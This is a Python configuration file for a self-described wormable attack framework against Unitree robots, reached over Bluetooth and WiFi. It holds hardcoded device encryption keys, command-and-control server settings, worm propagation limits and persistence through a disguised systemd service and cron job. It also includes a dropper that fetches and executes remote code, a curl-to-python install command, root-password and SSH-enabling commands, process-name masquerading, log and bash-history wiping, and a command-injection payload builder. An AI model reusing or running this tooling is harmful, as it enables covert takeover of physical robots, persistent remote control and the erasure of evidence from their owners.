#!/usr/bin/env python3
"""
Centralized configuration for Unitree Wormable Attack Framework
"""

import os
from datetime import timedelta

# ============================================================================
# BLE Protocol Configuration
# ============================================================================

# Hardcoded AES credentials (same across all Unitree devices)
AES_KEY = bytes.fromhex("df98b715d5c6ed2b25817b6f2554124a")
AES_IV = bytes.fromhex("2841ae97419c2973296a0d4bdfe19a4f")

# BLE Service UUIDs
UNITREE_SERVICE_UUID = "0000ffe0-0000-1000-8000-00805f9b34fb"
NOTIFY_CHAR_UUID = "0000ffe1-0000-1000-8000-00805f9b34fb"
WRITE_CHAR_UUID = "0000ffe2-0000-1000-8000-00805f9b34fb"
DEVICE_NAME_UUID = "00002a00-0000-1000-8000-00805f9b34fb"

# Authentication
HANDSHAKE_SECRET = "unitree"

# Supported robot models
SUPPORTED_MODELS = ["G1_", "Go2_", "B2_", "H1_", "X1_"]

# BLE scan settings
BLE_SCAN_TIMEOUT = 30.0
BLE_CHUNK_SIZE = 14
BLE_CONNECTION_TIMEOUT = 30.0

# ============================================================================
# C2 Server Configuration
# ============================================================================

# Server settings
C2_HOST = os.getenv("C2_HOST", "0.0.0.0")
C2_PORT = int(os.getenv("C2_PORT", "8443"))
C2_USE_TLS = os.getenv("C2_USE_TLS", "true").lower() == "true"

# C2 endpoints
C2_BEACON_ENDPOINT = "/api/v1/beacon"
C2_TASK_ENDPOINT = "/api/v1/tasks"
C2_REPORT_ENDPOINT = "/api/v1/report"
C2_PAYLOAD_ENDPOINT = "/api/v1/payload"

# Authentication
C2_API_KEY = os.getenv("C2_API_KEY", "worm-operator-key-change-me")
C2_OPERATOR_PASSWORD = os.getenv("C2_OPERATOR_PASSWORD", "admin123")  # Change in production!

# Database
DB_PATH = os.getenv("DB_PATH", "worm_c2.db")
DB_BACKUP_INTERVAL = timedelta(hours=6)

# ============================================================================
# Worm Agent Configuration
# ============================================================================

# Beacon settings
BEACON_INTERVAL_MIN = 60  # seconds
BEACON_INTERVAL_MAX = 300  # seconds (add jitter for OpSec)
BEACON_RETRY_COUNT = 3
BEACON_TIMEOUT = 30

# Propagation settings
PROPAGATION_ENABLED = True
PROPAGATION_BLE_INTERVAL = 120  # seconds between BLE scans
PROPAGATION_WIFI_INTERVAL = 300  # seconds between WiFi scans
PROPAGATION_MAX_CONCURRENT = 3  # max simultaneous infections
PROPAGATION_RATE_LIMIT = 5  # max infections per hour

# Infection tracking
INFECTION_HISTORY_PATH = "/tmp/.unitree_targets"
INFECTION_BLACKLIST_PATH = "/tmp/.unitree_blacklist"

# ============================================================================
# Persistence Configuration
# ============================================================================

# Installation paths (on robot)
WORM_INSTALL_PATH = "/usr/local/bin/unitree-updater"
WORM_CONFIG_PATH = "/etc/unitree/.config"
WORM_LOG_PATH = "/var/log/unitree-service.log"

# Systemd service
SYSTEMD_SERVICE_NAME = "unitree-service"
SYSTEMD_SERVICE_PATH = f"/etc/systemd/system/{SYSTEMD_SERVICE_NAME}.service"

# Cron job
CRON_SCHEDULE = "*/15 * * * *"  # Every 15 minutes

# ============================================================================
# Payload Configuration
# ============================================================================

# Stage 0: Initial dropper (minimal footprint)
STAGE0_TEMPLATE = """python3 -c "import urllib.request,base64,os;exec(urllib.request.urlopen('{c2_url}/api/v1/payload/stage1?id={robot_id}').read())" """

# Stage 1: Full agent download
STAGE1_SIZE_LIMIT = 50000  # bytes (for BLE transfer limitations)

# Payload delivery
PAYLOAD_ENCODING = "base64"
PAYLOAD_COMPRESSION = True

# ============================================================================
# Operational Security
# ============================================================================

# Process obfuscation
PROCESS_NAMES = [
    "[kworker/0:1]",
    "systemd-udevd",
    "systemd-journald", 
    "rsyslogd",
    "dbus-daemon"
]

# Log cleaning
CLEAN_LOGS = True
TARGET_LOGS = [
    "/var/log/syslog",
    "/var/log/auth.log",
    "/var/log/daemon.log",
    "~/.bash_history"
]

# Network OpSec
USE_DOMAIN_FRONTING = False
DNS_TUNNEL_DOMAIN = "updates.unitree.com"  # Fake domain for DNS tunneling
TLS_CERT_PATH = "certs/server.crt"
TLS_KEY_PATH = "certs/server.key"

# ============================================================================
# WiFi Network Configuration
# ============================================================================

# Network scanning
NETWORK_SCAN_TIMEOUT = 30
NETWORK_PORT_SCAN_RANGE = [22, 80, 443, 8080, 8443]  # Common robot services

# WiFi credentials for propagation
WIFI_COUNTRY_CODE = "US"

# ============================================================================
# Kill Switch Configuration
# ============================================================================

# Dead man's switch
DEAD_MANS_SWITCH_ENABLED = True
DEAD_MANS_SWITCH_INTERVAL = timedelta(hours=24)

# Self-destruct triggers
SELF_DESTRUCT_DATE = None  # Set to datetime for time-based cleanup
SELF_DESTRUCT_COMMAND = "DESTROY_ALL"

# Cleanup operations
CLEANUP_REMOVE_FILES = True
CLEANUP_REMOVE_PERSISTENCE = True
CLEANUP_CLEAR_LOGS = True

# ============================================================================
# Predefined Commands
# ============================================================================

PREDEFINED_COMMANDS = {
    "enable_ssh": r"echo 'root:Bin4ryWasHere'|chpasswd;sed -i 's/^#*\s*PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config;/etc/init.d/ssh start",
    "reboot": "reboot -f",
    "install_worm": "curl -s {c2_url}/api/v1/payload/full | python3",
    "start_propagation": "systemctl start {service_name}",
    "collect_intel": "ip addr; ip route; ps aux; ls /home; cat /proc/cpuinfo"
}

# ============================================================================
# Debugging & Development
# ============================================================================

DEBUG_MODE = os.getenv("WORM_DEBUG", "false").lower() == "true"
VERBOSE_LOGGING = DEBUG_MODE
SIMULATE_INFECTIONS = DEBUG_MODE  # Don't actually infect in debug mode

# ============================================================================
# Build injection payload helper
# ============================================================================

def build_injection_payload(cmd):
    """Build command injection payload for WiFi config vulnerability"""
    return f'";$({cmd});#'

def get_c2_url():
    """Get full C2 URL"""
    protocol = "https" if C2_USE_TLS else "http"
    return f"{protocol}://{C2_HOST}:{C2_PORT}"

